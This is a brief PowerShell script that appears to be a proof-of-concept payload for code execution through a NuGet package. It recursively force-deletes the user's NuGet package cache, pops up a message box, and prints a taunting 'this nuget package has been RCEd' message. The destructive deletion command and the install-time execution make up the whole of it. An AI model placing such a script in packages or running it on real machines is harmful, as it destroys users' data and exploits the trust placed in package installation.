rm "$env:USERPROFILE\.nuget\packages" -r -force
Add-Type -AssemblyName PresentationFramework
[System.Windows.MessageBox]::Show('Hello World')
Write-Output 'Hello From ps, this nuget package has been RCEd! Microsoft, get pwnd...'